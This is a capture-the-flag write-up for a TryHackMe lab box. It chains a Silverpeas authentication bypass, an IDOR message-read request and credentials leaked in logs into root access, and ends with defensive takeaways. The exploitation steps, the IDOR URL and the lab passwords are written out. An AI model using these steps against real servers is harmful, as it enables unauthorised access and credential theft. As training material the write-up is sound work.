# 🍽️ Silver Platter: Easy

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `silverplatter.thm` |
| **OS** | Ubuntu |
| **Attack Surface** | Silverpeas authentication bypass (CVE-2023-47323 chain) → SSH credential leak in message |
| **Privesc** | `adm` group → `auth.log` leaks `tyler`'s password in Docker command → `sudo ALL` → root |

Silver Platter runs the Silverpeas collaboration platform on port 8080. Two CVEs chain together: an authentication bypass to log in as `SilverAdmin`, then an insecure direct object reference to read other users' messages. A message to `tim` contains his SSH credentials in plaintext. On the box, `tim` is in the `adm` group, giving read access to system logs. `auth.log` contains `tyler`'s password hardcoded in a Docker run command. `tyler` has unrestricted sudo.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 silverplatter.thm -oA silverplatter-tcp-scan
```

```
22/tcp   open  ssh    OpenSSH 8.9p1
80/tcp   open  http   nginx
8080/tcp open  http   Jetty (Silverpeas)
```

`http://silverplatter.thm:8080/silverpeas/` — Silverpeas login portal.

---

## 💀 Initial Access — Silverpeas CVE Chain

### Step 1 — Authentication Bypass (CVE-2023-47323 adjacent)

Using the technique from [ChrisPritchard's PoC](https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d), authenticated as `SilverAdmin` without valid credentials.

### Step 2 — IDOR: Read Another User's Message

Silverpeas mail endpoint does not enforce per-user access control. Incrementing the message `ID` parameter exposes messages belonging to other users:

```
GET /silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6
```

Message content:

```
Dude how do you always forget the SSH password? Use a password manager...
Username: tim
Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

### SSH Login

```bash
ssh tim@silverplatter.thm
# password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

---

## 🔁 Privilege Escalation — tim → tyler → root

### adm Group — Log Read Access

```bash
id tim
# groups=1001(tim),4(adm)
```

The `adm` group grants read access to `/var/log/`. `auth.log` logs all sudo and authentication events — including command arguments.

### Tyler's Password in auth.log

```bash
grep -i pass /var/log/auth.log
```

```
sudo: tyler : COMMAND=/usr/bin/docker run --name postgresql -d \
  -e POSTGRES_PASSWORD=_Zd_zx7N823/ \
  -v postgresql-data:/var/lib/postgresql/data postgres:12.3
```

The Docker container's `POSTGRES_PASSWORD` environment variable was passed as a CLI argument — logged verbatim by sudo. Password reuse: `tyler:_Zd_zx7N823/`

### Tyler → root via sudo ALL

```bash
su - tyler
# password: _Zd_zx7N823/

sudo -l
# (ALL : ALL) ALL

sudo su
# root@silver-platter:/home/tyler#
```

---

## 🗺️ Attack Chain

```
[Silverpeas — port 8080]
    CVE-2023-47323 auth bypass → login as SilverAdmin
    IDOR on ReadMessage.jsp?ID=6 → tim:cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
    SSH as tim
          │
          ▼
[adm group → /var/log/auth.log]
    Docker run command logged with POSTGRES_PASSWORD=_Zd_zx7N823/
    Password reuse → su tyler
          │
          ▼
[sudo ALL]
    sudo su → root
```

---

## 📌 Key Takeaways

- IDOR vulnerabilities in messaging systems expose data across all users if object ownership is not enforced server-side; never trust client-supplied IDs without authorization checks
- Environment variables passed as CLI arguments (e.g., `-e PASSWORD=value`) are visible in process listings and logged by sudo — use Docker secrets or `.env` files instead
- The `adm` group on Linux grants log read access; treat log files as potentially sensitive since they regularly capture credential material from misused CLI tools
- Password reuse across services (`POSTGRES_PASSWORD` → system account) is a recurring real-world finding; use a password manager and unique credentials per service

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Lateral Movement | Valid Accounts | [T1078](https://attack.mitre.org/techniques/T1078) |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo and Sudo Caching | [T1548.003](https://attack.mitre.org/techniques/T1548/003) |

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `ffuf` | Virtual host enumeration |
| Burp Suite | IDOR exploitation on /messages/ endpoint |
| `ssh` | Login as tim with leaked credentials |
| `grep` | Extract tyler's password from auth.log |

## 🚩 Flags

| Flag | Value |
| --- | --- |
| `user.txt` | `TBD` |
| `root.txt` | `TBD` |
